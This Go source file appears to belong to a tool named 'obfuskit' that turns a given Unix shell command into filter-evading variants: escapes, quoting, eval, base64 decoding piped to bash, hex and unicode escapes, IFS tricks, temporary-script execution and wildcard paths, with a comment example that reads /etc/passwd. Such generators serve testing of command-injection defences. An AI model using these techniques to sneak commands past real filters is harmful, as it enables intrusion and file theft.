package command

import (
	"fmt"
	"math/rand"
	"obfuskit/constants"
	"obfuskit/evasions"
	"strings"
	"time"
)

// UnixCmdVariants generates various Unix/Linux command evasion techniques
// based on the specified obfuscation level
func UnixCmdVariants(payload string, level constants.Level) []string {
	var variants []string

	// Basic evasion techniques
	variants = append(variants,
		backslashEvasion(payload),      // Using backslashes between characters
		quoteVariations(payload),       // Different quote styles
		spacingTechniques(payload),     // Various spacing techniques
		commandChaining(payload),       // Using ; && and || for chaining
		binaryPathObfuscation(payload), // /usr/bin/ path variations
		inlineComments(payload),        // Using inline comments #
		redirectionNoise(payload),      // Adding redirection that does nothing
		variableAssignment(payload),    // Simple variable assignment
		randomizedCase(payload),        // Random capitalization where possible
	)

	if level == constants.Basic {
		return evasions.UniqueStrings(variants)
	}

	// Medium level adds more complex techniques
	variants = append(variants,
		commandEvaluation(payload),     // Using eval and similar constructs
		processSubstitution(payload),   // $() process substitution
		hereStringTechniques(payload),  // Using here-strings
		ifs(payload),                   // IFS (Internal Field Separator) modification
		backticksSubstitution(payload), // Using backticks for command substitution
		stringConcatenation(payload),   // String concatenation techniques
		doubleEvaluation(payload),      // Multiple levels of eval
	)

	variants = append(variants, wildcardPathEvasion(payload)...)
	variants = append(variants, hexEncoding(payload)...)

	// Return medium variants if level is Medium
	if level == constants.Medium {
		return evasions.UniqueStrings(variants)
	}

	// Advanced level adds the most complex evasion techniques
	variants = append(variants,
		base64Techniques(payload),        // Base64 encoding/decoding
		arithmeticExpansion(payload),     // Using arithmetic expansion
		revShellTechniques(payload),      // Reverse shell techniques
		fileDescriptorTricks(payload),    // File descriptor manipulation
		unicodeEscapes(payload),          // Unicode escape sequences
		runtimeScriptGeneration(payload), // Generate script at runtime
		functionObfuscation(payload),     // Function-based obfuscation
		advancedIFSTricks(payload),       // Advanced IFS manipulation techniques
	)

	return evasions.UniqueStrings(variants)
}

// Basic evasion techniques
func backslashEvasion(payload string) string {
	result := ""
	for _, char := range payload {
		// Only backslash-escape regular characters, not special chars
		if rand.Intn(3) == 0 && char > 32 && char < 127 && char != '\\' && char != '\'' && char != '"' {
			result += "\\" + string(char)
		} else {
			result += string(char)
		}
	}
	return result
}

func quoteVariations(payload string) string {
	words := strings.Fields(payload)
	result := ""

	quoteTypes := []string{"'", "\""}

	for i, word := range words {
		if i > 0 {
			result += " "
		}

		if rand.Intn(3) == 0 {
			quoteType := quoteTypes[rand.Intn(len(quoteTypes))]
			result += quoteType + word + quoteType
		} else {
			result += word
		}
	}

	return result
}

func spacingTechniques(payload string) string {
	words := strings.Fields(payload)
	result := words[0]

	for i := 1; i < len(words); i++ {
		// Add random spaces or tabs
		spacesCount := 1 + rand.Intn(3)
		if rand.Intn(2) == 0 {
			result += strings.Repeat(" ", spacesCount) + words[i]
		} else {
			result += strings.Repeat("\t", 1+rand.Intn(2)) + words[i]
		}
	}

	return result
}

func commandChaining(payload string) string {
	separators := []string{" ; ", " && ", " || "}
	sep := separators[rand.Intn(len(separators))]

	// Add a harmless command
	harmlessCommands := []string{"true", ":", "/bin/true"}
	harmless := harmlessCommands[rand.Intn(len(harmlessCommands))]

	if rand.Intn(2) == 0 {
		return harmless + sep + payload
	} else {
		return payload + sep + harmless
	}
}

func binaryPathObfuscation(payload string) string {
	parts := strings.Fields(payload)
	if len(parts) == 0 {
		return payload
	}

	// Common binary paths
	pathVariations := []string{
		"/usr/bin/",
		"/bin/",
		"$(which ",
	}

	cmd := parts[0]
	path := pathVariations[rand.Intn(len(pathVariations))]

	// Only apply to commands that don't already have a path
	if !strings.Contains(cmd, "/") {
		if strings.HasPrefix(path, "$(") {
			parts[0] = path + cmd + ")"
		} else {
			parts[0] = path + cmd
		}
	}

	return strings.Join(parts, " ")
}

func inlineComments(payload string) string {
	words := strings.Fields(payload)
	if len(words) <= 1 {
		return payload
	}

	result := words[0]
	for i := 1; i < len(words); i++ {
		if rand.Intn(4) == 0 {
			// Add an inline comment between words
			result += " # Ignored comment\n" + words[i]
		} else {
			result += " " + words[i]
		}
	}

	return result
}

func variableAssignment(payload string) string {
	parts := strings.Fields(payload)
	if len(parts) == 0 {
		return payload
	}

	// Create simple variable assignment
	result := "cmd=" + parts[0] + "; $cmd"

	if len(parts) > 1 {
		result += " " + strings.Join(parts[1:], " ")
	}

	return result
}

func redirectionNoise(payload string) string {
	redirections := []string{
		" 2>/dev/null",
		" >/dev/null",
		" 2>&1",
	}

	// Add 1 redirection
	redirection := redirections[rand.Intn(len(redirections))]
	return payload + redirection
}

func randomizedCase(payload string) string {
	// Only apply to commands where case doesn't matter
	parts := strings.Fields(payload)
	if len(parts) == 0 {
		return payload
	}

	result := ""
	cmd := parts[0]

	// Only uppercase some letters in the command
	for _, char := range cmd {
		if char >= 'a' && char <= 'z' && rand.Intn(3) == 0 {
			result += strings.ToUpper(string(char))
		} else {
			result += string(char)
		}
	}

	parts[0] = result
	return strings.Join(parts, " ")
}

// Medium evasion techniques

func randomVarName() string {
	const letters = "abcdefghijklmnopqrstuvwxyz"
	rand.Seed(time.Now().UnixNano())
	length := rand.Intn(3) + 2 // random length between 2-4
	var name strings.Builder
	for i := 0; i < length; i++ {
		name.WriteByte(letters[rand.Intn(len(letters))])
	}
	return name.String()
}

func splitStringRandomly(s string) []string {
	if len(s) <= 2 {
		return []string{s}
	}

	parts := []string{}
	start := 0
	splits := 1
	if len(s) > 5 {
		splits = rand.Intn(2) + 2 // 2 or 3 parts
	}
	splitPoints := []int{}
	for i := 0; i < splits-1; i++ {
		point := rand.Intn(len(s)-1) + 1
		splitPoints = append(splitPoints, point)
	}
	splitPoints = append(splitPoints, len(s))

	sortInts(splitPoints)

	for _, end := range splitPoints {
		parts = append(parts, s[start:end])
		start = end
	}
	return parts
}

func stringConcatenation(payload string) string {
	parts := strings.Fields(payload)
	if len(parts) == 0 {
		return payload
	}

	assignments := []string{}
	reassembledParts := []string{}

	for _, part := range parts {
		fragments := splitStringRandomly(part)
		varNames := []string{}
		for _, frag := range fragments {
			varName := randomVarName()
			assignments = append(assignments, fmt.Sprintf("%s='%s'", varName, frag))
			varNames = append(varNames, varName)
		}
		reassembledParts = append(reassembledParts, fmt.Sprintf("${%s}", strings.Join(varNames, "}${")))
	}

	result := strings.Join(assignments, "; ") + "; " + strings.Join(reassembledParts, " ")
	return result
}

func sortInts(nums []int) {
	for i := 0; i < len(nums); i++ {
		for j := i + 1; j < len(nums); j++ {
			if nums[j] < nums[i] {
				nums[i], nums[j] = nums[j], nums[i]
			}
		}
	}
}

func hexEncoding(payload string) []string {
	parts := strings.Fields(payload)
	if len(parts) == 0 {
		return []string{payload}
	}

	// Convert the command to hex
	cmd := parts[0]
	hexCmd := ""

	for _, c := range cmd {
		if rand.Intn(2) == 0 {
			hexCmd += fmt.Sprintf("\\x%02x", c)
		} else {
			hexCmd += string(c)
		}
	}

	parts[0] = "$'" + hexCmd + "'"
	if len(parts) == 1 {
		return []string{strings.Join(parts, " ")}
	}

	argsVariants := [][]string{
		obfuscateArgs(parts[1:], onlyQuestionMark),
		obfuscateArgs(parts[1:], onlyStar),
		obfuscateArgs(parts[1:], mixStarQuestionMark),
	}

	var finalPayloads []string

	for _, args := range argsVariants {
		finalPayloads = append(finalPayloads, strings.Join(parts[0:1], " ")+" "+strings.Join(args, " "))
	}

	finalPayloads = append(finalPayloads, strings.Join(parts, " "))
	return finalPayloads
}

func commandEvaluation(payload string) string {
	evalFunctions := []string{
		"eval",
		"bash -c",
	}

	evalFunc := evalFunctions[rand.Intn(len(evalFunctions))]

	if evalFunc == "eval" {
		return evalFunc + " '" + payload + "'"
	} else {
		return evalFunc + " '" + payload + "'"
	}
}

func processSubstitution(payload string) string {
	return "$(echo '" + payload + "')"
}

func hereStringTechniques(payload string) string {
	return "bash <<< \"" + payload + "\""
}

func ifs(payload string) string {
	// Simpler IFS modification that actually works
	return "IFS=' '; " + payload
}

func backticksSubstitution(payload string) string {
	parts := strings.Fields(payload)
	if len(parts) == 0 {
		return payload
	}

	cmd := parts[0]
	args := ""
	if len(parts) > 1 {
		args = " " + strings.Join(parts[1:], " ")
	}

	// Use backticks instead of $()
	return fmt.Sprintf("`echo %s`%s", cmd, args)
}

func doubleEvaluation(payload string) string {
	// Use a single layer of eval with proper quoting
	return fmt.Sprintf("eval \"echo '%s' | bash\"", payload)
}

// Advanced evasion techniques

func base64Techniques(payload string) string {
	// This function would actually base64 encode in a real implementation
	// base64Command := fmt.Sprintf("echo '%s' | base64", payload)
	// In a real implementation, you'd run this command, capture the output,
	// and use it in the following command:
	encodedPayload := "ZWNobyAiaGVsbG8gd29ybGQi" // Placeholder example
	return fmt.Sprintf("echo %s | base64 -d | bash", encodedPayload)
}

func arithmeticExpansion(payload string) string {
	parts := strings.Fields(payload)
	if len(parts) == 0 {
		return payload
	}

	// Convert first character to ASCII code for demonstration
	cmd := parts[0]
	if len(cmd) > 0 {
		firstChar := int(cmd[0])
		cmdVar := fmt.Sprintf("$(printf \\$(printf '%03o' %d))", firstChar) + cmd[1:]
		parts[0] = cmdVar
	}

	return strings.Join(parts, " ")
}

func revShellTechniques(payload string) string {
	// Simpler background execution pattern
	return fmt.Sprintf("(exec %s) &", payload)
}

func fileDescriptorTricks(payload string) string {
	// File descriptor redirection that actually works
	return fmt.Sprintf("{ %s; } 2>&1", payload)
}

func unicodeEscapes(payload string) string {
	parts := strings.Fields(payload)
	if len(parts) == 0 {
		return payload
	}

	cmd := parts[0]
	unicodeCmd := ""

	// Only convert a few characters to unicode escapes
	for _, c := range cmd {
		if rand.Intn(3) == 0 && c > 32 && c < 127 {
			unicodeCmd += fmt.Sprintf("\\u%04x", c)
		} else {
			unicodeCmd += string(c)
		}
	}

	parts[0] = "$'" + unicodeCmd + "'"
	return strings.Join(parts, " ")
}

func runtimeScriptGeneration(payload string) string {
	// Generate a script at runtime and execute it
	return fmt.Sprintf("cat > /tmp/.s$$ << 'EOF'\n#!/bin/bash\n%s\nEOF\nchmod +x /tmp/.s$$ && /tmp/.s$$ && rm /tmp/.s$$", payload)
}

func functionObfuscation(payload string) string {
	parts := strings.Fields(payload)
	if len(parts) == 0 {
		return payload
	}

	// Create a function with a random name
	funcName := fmt.Sprintf("f%d", rand.Intn(1000))

	args := ""
	if len(parts) > 1 {
		args = " " + strings.Join(parts[1:], " ")
	}

	return fmt.Sprintf("function %s() { %s \"$@\"; }; %s%s", funcName, parts[0], funcName, args)
}

func advancedIFSTricks(payload string) string {
	// Simpler IFS trick that actually works
	parts := strings.Fields(payload)
	if len(parts) == 0 {
		return payload
	}

	// Set IFS to newline and recompose the command
	return fmt.Sprintf("IFS=$'\\n'; cmd=(%s); \"${cmd[@]}\"",
		strings.Join(parts, "$'\\n'"))
}

/*
	Returns a list of 3 versions:
	cat /e??/p?ss??
	/u?r/??n/c?t /e??/p?ss??
	cat /e??/p?ss??
*/

func wildcardPathEvasion(payload string) []string {

	if payload == "" || !strings.Contains(payload, "/") {
		return nil
	}

	parts := strings.Fields(payload)
	if len(parts) == 0 {
		return nil
	}

	cmd := parts[0]
	prefixes := []string{
		"/usr/bin/", "/usr/local/bin/", "/bin/",
		"/usr/sbin/", "/usr/local/sbin/",
		"/u?r/??n/", "/u?r/l?c?l/b??/",
		"/b?n/", "/u?r/s?b?/", "/u?r/l?c?l/s?b?/", "",
	}

	newPrefixes := buildPrefixes(cmd, prefixes)

	// Process arguments
	argsVariants := [][]string{
		obfuscateArgs(parts[1:], onlyQuestionMark),
		obfuscateArgs(parts[1:], onlyStar),
		obfuscateArgs(parts[1:], mixStarQuestionMark),
	}

	var finalPayloads []string
	for _, args := range argsVariants {
		for _, prefix := range newPrefixes {
			finalPayloads = append(finalPayloads, combine(prefix, args))
		}
	}

	return finalPayloads
}

func buildPrefixes(cmd string, prefixes []string) []string {
	var result []string
	result = append(result, cmd)

	if strings.Contains(cmd, "/") {
		lastPart := cmd[strings.LastIndex(cmd, "/"):]
		for _, prefix := range prefixes {
			result = append(result, prefix+lastPart)
		}
	} else {
		for _, prefix := range prefixes {
			result = append(result, prefix+cmd)
		}
	}
	return result
}

func obfuscateArgs(args []string, obfuscateFunc func(string) string) []string {
	var obfuscated []string
	for _, arg := range args {
		if strings.Contains(arg, "/") {
			obfuscated = append(obfuscated, obfuscateFunc(arg))
		} else {
			obfuscated = append(obfuscated, arg)
		}
	}
	return obfuscated
}

func onlyQuestionMark(s string) string {
	var b strings.Builder
	for _, ch := range s {
		if ch == '/' {
			b.WriteRune(ch)
		} else if rand.Intn(3) == 0 {
			b.WriteByte('?')
		} else {
			b.WriteRune(ch)
		}
	}
	return b.String()
}

func onlyStar(s string) string {
	var b strings.Builder
	for _, ch := range s {
		if ch == '/' {
			b.WriteRune(ch)
		} else if rand.Intn(3) == 0 {
			b.WriteByte('*')
		} else {
			b.WriteRune(ch)
		}
	}
	return b.String()
}

func mixStarQuestionMark(s string) string {
	var b strings.Builder
	for _, ch := range s {
		if ch == '/' {
			b.WriteRune(ch)
		} else {
			switch rand.Intn(3) {
			case 0:
				b.WriteByte('?')
			case 1:
				b.WriteByte('*')
			default:
				b.WriteRune(ch)
			}
		}
	}
	return b.String()
}

func combine(prefix string, args []string) string {
	return prefix + " " + strings.Join(args, " ")
}
